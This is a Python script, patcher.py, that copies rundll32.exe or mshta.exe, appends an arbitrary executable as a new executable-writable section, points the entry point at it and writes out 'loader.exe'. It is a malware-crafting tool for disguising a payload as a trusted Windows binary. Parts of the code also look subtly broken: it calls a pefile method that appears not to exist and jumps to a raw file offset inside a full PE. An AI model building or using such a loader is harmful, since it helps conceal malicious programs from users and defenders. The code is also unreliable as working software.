# language: Python 3.11, file: patcher.py
import sys, os, shutil, platform
from pathlib import Path

try:
    import pefile
except ImportError:
    import subprocess
    subprocess.run([sys.executable, "-m", "pip", "install", "-q", "pefile"], check=True)
    import pefile


def pick_stub() -> Path:
    win = Path(os.environ.get("WINDIR", r"C:\Windows"))
    is64 = platform.architecture()[0] == "64bit"
    if is64:
        candidates = [win / "System32" / "rundll32.exe",
                      win / "System32" / "mshta.exe"]
    else:
        candidates = [win / "SysWOW64" / "rundll32.exe",
                      win / "SysWOW64" / "mshta.exe"]
    for c in candidates:
        if c.exists():
            return c
    raise FileNotFoundError("no suitable stub found")


def align_up(v: int, a: int) -> int:
    return (v + a - 1) & ~(a - 1)


def patch(build_exe: Path) -> Path:
    stub = pick_stub()
    out = build_exe.parent / "loader.exe"
    if out.exists():
        try:
            out.unlink()
        except PermissionError:
            out = build_exe.parent / "loader_alt.exe"
    shutil.copy(stub, out)

    stub_pe = pefile.PE(str(out))
    payload = build_exe.read_bytes()

    file_align = stub_pe.OPTIONAL_HEADER.FileAlignment
    sect_align = stub_pe.OPTIONAL_HEADER.SectionAlignment

    name = b".pay1\x00\x00\x00"
    payload_padded = payload + b"\x00" * (align_up(len(payload), file_align) - len(payload))

    last = max(stub_pe.section_headers,
               key=lambda s: s.VirtualAddress + max(s.Misc_VirtualSize, s.SizeOfRawData))
    new_rva = align_up(last.VirtualAddress + max(last.Misc_VirtualSize, last.SizeOfRawData),
                       sect_align)
    new_raw_size = len(payload_padded)
    new_virt_size = len(payload)

    stub_pe.add_section(
        name, payload_padded, new_rva, new_raw_size, new_virt_size,
        pefile.SECTION_CHARACTERISTICS["IMAGE_SCN_MEM_EXECUTE"]
        | pefile.SECTION_CHARACTERISTICS["IMAGE_SCN_MEM_READ"]
        | pefile.SECTION_CHARACTERISTICS["IMAGE_SCN_MEM_WRITE"]
        | pefile.SECTION_CHARACTERISTICS["IMAGE_SCN_CNT_CODE"],
    )

    payload_pe = pefile.PE(str(build_exe), fast_load=True)
    payload_entry_rva = payload_pe.OPTIONAL_HEADER.AddressOfEntryPoint
    entry_raw = None
    for s in payload_pe.section_headers:
        if s.VirtualAddress <= payload_entry_rva < s.VirtualAddress + max(s.Misc_VirtualSize, s.SizeOfRawData):
            entry_raw = s.PointerToRawData + (payload_entry_rva - s.VirtualAddress)
            break
    if entry_raw is None:
        raise RuntimeError("cannot resolve payload entry raw offset")

    stub_pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_rva + entry_raw
    stub_pe.OPTIONAL_HEADER.CheckSum = 0
    stub_pe.write(str(out))
    stub_pe = pefile.PE(str(out))
    stub_pe.OPTIONAL_HEADER.CheckSum = stub_pe.generate_checksum()
    stub_pe.write(str(out))
    stub_pe.close()

    print(f"[+] loader.exe ready: {out} ({out.stat().st_size} bytes)")
    return out


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: patcher.py <build.exe>")
        sys.exit(1)
    patch(Path(sys.argv[1]))
